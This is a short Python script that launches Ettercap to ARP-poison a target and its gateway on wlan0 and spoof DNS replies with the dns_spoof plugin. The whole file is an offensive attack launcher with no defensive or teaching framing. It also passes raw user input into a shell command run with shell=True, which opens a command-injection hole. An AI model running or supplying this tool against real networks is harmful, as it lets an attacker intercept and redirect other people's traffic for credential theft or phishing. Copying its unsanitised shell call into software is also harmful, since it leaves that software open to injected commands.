import subprocess

def run_ettercap():
    print("🕵️ Starting Ettercap DNS spoofing setup...")
    
    target_ip = input("Enter target IP: ").strip()
    gateway_ip = input("Enter gateway IP: ").strip()

    # Build the Ettercap command
    command = f"sudo ettercap -T -q -i wlan0 -M arp:remote /{target_ip}// /{gateway_ip}// -P dns_spoof"

    print(f"\n📡 Running:\n{command}\n")
    
    try:
        subprocess.run(command, shell=True)
    except Exception as e:
        print("❌ Error running Ettercap:", e)

if __name__ == "__main__":
    run_ettercap()